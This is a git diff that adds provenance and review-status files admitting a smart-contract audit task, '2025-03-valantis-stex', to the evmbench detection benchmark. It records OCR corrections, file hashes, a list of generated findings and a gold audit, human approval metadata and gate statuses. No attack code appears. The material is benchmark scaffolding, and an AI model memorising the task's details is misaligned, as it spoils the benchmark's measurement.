++      "git_confirmed": true
++    },
++    {
++      "page": 13,
++      "field": "report_id",
++      "ocr_value": "VLTS3-i3",
++      "corrected_value": "VLTS3-13",
++      "pdf_confirmed": true,
++      "git_confirmed": true
++    },
++    {
++      "page": 13,
++      "field": "affected_path",
++      "ocr_value": "src/stHYPEWithdrawalModule.solutpdate#L431-L475",
++      "corrected_value": "src/stHYPEWithdrawalModule.sol:update#L431-L475",
++      "pdf_confirmed": true,
++      "code_confirmed": true
++    },
++    {
++      "pages": [10, 11, 12],
++      "field": "code_identifiers",
++      "ocr_values": ["TokenI", "TokenO", "unstateToken0Reserves"],
++      "corrected_values": ["Token1", "Token0", "unstakeToken0Reserves"],
++      "pdf_confirmed": true,
++      "code_confirmed": true
++    },
++    {
++      "pages": [14, 17, 18, 20, 22, 24, 27],
++      "field": "code_identifiers",
++      "corrected_values": ["safeTransferFrom", "isZeroToOne", "MockStHype", "ILendingModule", "stHYPEWithdrawalModule__claim_cannotYetClaim", "withdrawalModule.update", "_amount0Min"],
++      "pdf_confirmed": true,
++      "code_confirmed": true
++    }
++  ],
++  "review_reports": [
++    {"phase": "P1", "path": "../_reports/2025-03-valantis-stex/p1-adjacent-checkouts-read-only.txt", "sha256": "b422115b8b0c7ae0ec083aeb9a1a44fbad72ed7c4e48c2407d3a7e9b171d0ccf"},
++    {"phase": "P1", "path": "../_reports/2025-03-valantis-stex/p1-checkout-isolation.json", "sha256": "92dc2f32abe73a45f47f1725675b29a76c2557dafe7437deb6bc6b5408866b5a"},
++    {"phase": "P1", "path": "../_reports/2025-03-valantis-stex/p1-input-hashes.json", "sha256": "fdf238239f566d61a6df8344a9aa3477a49f5e8e7d2ff3b19cd99bdaeb17e582"},
++    {"phase": "P2", "path": "../_reports/2025-03-valantis-stex/p2-ocr-validation.json", "sha256": "53bfbaf959a25c8faeb3043b4f6359068405a061d7050fb64817fb3ae90f07fc"},
++    {"phase": "P2", "path": "../_reports/2025-03-valantis-stex/p2-ocr-validation.txt", "sha256": "75cf5b0f89c157b0af5629fb7a3248e110559b67dbb80d98b12162a54e76f0e3"},
++    {"phase": "P2", "path": "../_reports/2025-03-valantis-stex/p2-validator-tests.txt", "sha256": "98d5d7149aeb252c42ea531698f78f40fa6ed4bf6758145318feb87ebd206469"},
++    {"phase": "P3", "path": "../_reports/2025-03-valantis-stex/p3-pdf-ocr-review.md", "sha256": "37a555441e8bf1df52cec4cda7f548f61c6e7ac70085092b19fca27d0fef070c"},
++    {"phase": "P3", "path": "../_reports/2025-03-valantis-stex/p3-pdf-validation.json", "sha256": "d12a849403e4dc751a88ef43896ed9923c39ceb7c85957f97624c0b93719e8ff"},
++    {"phase": "P4", "path": "../_reports/2025-03-valantis-stex/p4-finding-grounding.md", "sha256": "6596ccf985b7aeacd0d4cda09bd1195b785a5c2a6503acc69b63ff6de0cca7b2"},
++    {"phase": "P4", "path": "../_reports/2025-03-valantis-stex/p4-ocr-corrections.json", "sha256": "b40b6819b69d229aae0109e518b2c6c30df2ce8e3408a66dca65790a91461385"},
++    {"phase": "P4", "path": "../_reports/2025-03-valantis-stex/p4-report-dispositions.json", "sha256": "0f79df4599cb6563bceaf8f2470e604193d9a559b55ef18b4e06e995deec7a84"},
++    {"phase": "P4", "path": "../_reports/2025-03-valantis-stex/p4-repository-snapshot.json", "sha256": "7f4cec4aa46474b45dde240f8083b585d1d844399be02a16d67bf053e4644b6e"},
++    {"phase": "P4", "path": "../_reports/2025-03-valantis-stex/p4-submodules.json", "sha256": "ea41e2cd0a73b4cfa6cdd9824f9ce1effab25a287f1b15e4310b5faf04b80767"},
++    {"phase": "P4", "path": "../_reports/2025-03-valantis-stex/p4-task-group.json", "sha256": "6bb741bff0d5cbad73ec23a3335e784b8a434e362e60a2e785f683fcd1210135"}
++  ],
++  "generated_files": [
++    ".dockerignore",
++    "Dockerfile",
++    "config.yaml",
++    "findings/H-01.md",
++    "findings/H-02.md",
++    "findings/H-03.md",
++    "findings/H-04.md",
++    "findings/H-05.md",
++    "findings/gold_audit.md",
++    "ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl",
++    "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl",
++    "ocr_evidence/pdf_002911_39a2c2ee71c9/H-03.pages.jsonl",
++    "ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl",
++    "ocr_evidence/pdf_002911_39a2c2ee71c9/H-05.pages.jsonl",
++    "ocr_evidence/pdf_002911_39a2c2ee71c9/scope.pages.jsonl",
++    "provenance.json",
++    "review_status.yaml"
++  ],
++  "generated_file_inventory": [
++    {"path": ".dockerignore", "size_bytes": 30, "sha256": "dff903861d9f0c39b4b107cf206243154443e801c48042429b6eaeaa311c9f64"},
++    {"path": "Dockerfile", "size_bytes": 2981, "sha256": "66a686a2bc590a83f949d0d0c0fcc6c1a443497bc6a8257a48c9dc77405b296b"},
++    {"path": "config.yaml", "size_bytes": 597, "sha256": "3b94a08a67a70df835637eebe811d5074e368d2af067057fd797b011d6b9713a"},
++    {"path": "findings/H-01.md", "size_bytes": 3136, "sha256": "920af3de53e29224ffc67a4b3747b426c26f6864c3b1b8a4e75989514b77683c"},
++    {"path": "findings/H-02.md", "size_bytes": 2361, "sha256": "c22e53e5479834ae74b262ac85af2ac6cdb950d6a1f053cfeb68991c3f3406a3"},
++    {"path": "findings/H-03.md", "size_bytes": 2132, "sha256": "a57381c7bde062e8820751129bfc4dc15a9df26440e7f929f30dbf16af3829f6"},
++    {"path": "findings/H-04.md", "size_bytes": 2449, "sha256": "145f4bad130f99d2d52c3f86fc14a64984ae1ce2a65563c4416f6f238035841f"},
++    {"path": "findings/H-05.md", "size_bytes": 2884, "sha256": "7009a743726581495a3fb484638c01cfd729d0c35ef26437c51f58ba5df586c9"},
++    {"path": "findings/gold_audit.md", "size_bytes": 12962, "sha256": "c60bc769fb33238badcfc2d720e7b75a3f51a3ae37862fc437369063bb91a4b8"},
++    {"path": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl", "size_bytes": 16873, "sha256": "5c52d390418d56ba03a94f371985ba5b9e4bd9f338763c918e9b69cef198f4a4"},
++    {"path": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl", "size_bytes": 31293, "sha256": "e8741e2b9ae9d9a6474dae40ca05627cbf8b643dffd9f95fd25efab05b3ea6ac"},
++    {"path": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-03.pages.jsonl", "size_bytes": 9299, "sha256": "a01f69d0ae9931e254fbcadee266840d9d001352b29f1584e52d80ffb3b5cc71"},
++    {"path": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-04.pages.jsonl", "size_bytes": 23083, "sha256": "18d290f85914fc28bc922978e0bb7896062b1f8a7b2efe0b672ced0642d42f4f"},
++    {"path": "ocr_evidence/pdf_002911_39a2c2ee71c9/H-05.pages.jsonl", "size_bytes": 10370, "sha256": "3fa57a38b90bb99d494d4175401993322175c82f8680aa6a1213d1f34db0b7c3"},
++    {"path": "ocr_evidence/pdf_002911_39a2c2ee71c9/scope.pages.jsonl", "size_bytes": 3641, "sha256": "b5e7c3be6170240c10ad218462ec7290e0bfd2765fc542ee1e0d72b6eb7014e6"},
++    {"path": "provenance.json", "size_bytes": null, "sha256": null, "hash_location": "../_reports/2025-03-valantis-stex/p7-approved-file-manifest.json"},
++    {"path": "review_status.yaml", "size_bytes": 241, "sha256": "3f0e5663c18c465dec2eb7201d8a1d8408d26a170f14fb73c70b60bcc4070ee8"}
++  ],
++  "review_state": "approved_for_admission",
++  "human_approved": true,
++  "approved_by": "https://github.com/pranay5255",
++  "approval": {
++    "checkpoint": "C1R3",
++    "candidate_id": "2025-03-valantis-stex",
++    "review_bundle_digest": "11dd3b8f667da20aab1d343e804e7f53122ee64a5b0d086fc27a53445e05fe01",
++    "approved_at": "2026-07-27T10:21:14Z",
++    "reviewer_identity": "https://github.com/pranay5255",
++    "reviewer_github_login": "pranay5255",
++    "reviewer_github_user_id": 22420966,
++    "explicit_admission_approval": true
++  },
++  "admission": {
++    "approved_for_admission": true,
++    "evmbench_admitted": true,
++    "isolated_evmbench_path": "/tmp/valantis-ocr-harbor.iZKXoT/forest-of-audits/project/evmbench/audits/2025-03-valantis-stex",
++    "harbor_task_generated": true,
++    "harbor_task_path": "/tmp/valantis-harbor-dataset.Vrdzx8/evmbench__detect-2025-03-valantis-stex",
++    "harbor_loader_passed": true,
++    "live_smoke_status": "blocked_preflight"
++  },
++  "pending_gates": {
++    "P6_structural_semantic_repository_build_and_leakage_validation": "passed",
++    "P7_candidate_approval_checkpoint": "passed",
++    "P8_admission": "passed",
++    "P9_separate_images": "passed",
++    "P10_harbor_generation_and_migration": "passed",
++    "P11_harbor_0_20_loader": "passed",
++    "P12_harbor_smoke": "blocked_missing_openai_credential_and_strict_no_network_model_transport",
++    "P12_final_manifest": "pending"
++  }
++}
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/review_status.yaml b/project/evmbench/audits/2025-03-valantis-stex/review_status.yaml
+new file mode 100644
+index 0000000..3efa499
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/review_status.yaml
+@@ -0,0 +1,6 @@
++state: approved_for_admission
++human_approved: true
++approved_by: https://github.com/pranay5255
++approved_at: 2026-07-27T10:21:14Z
++approval_checkpoint: C1R3
++review_bundle_digest: 11dd3b8f667da20aab1d343e804e7f53122ee64a5b0d086fc27a53445e05fe01
+diff --git a/project/evmbench/splits/detect-tasks.txt b/project/evmbench/splits/detect-tasks.txt
+index b14cafd..42bfc56 100644
+--- a/project/evmbench/splits/detect-tasks.txt
++++ b/project/evmbench/splits/detect-tasks.txt
+@@ -30,6 +30,7 @@
+ 2025-01-liquid-ron
+ 2025-01-next-generation
+ 2025-02-thorwallet
++2025-03-valantis-stex
+ 2025-04-forte
+ 2025-04-virtuals
+ 2025-05-blackhole
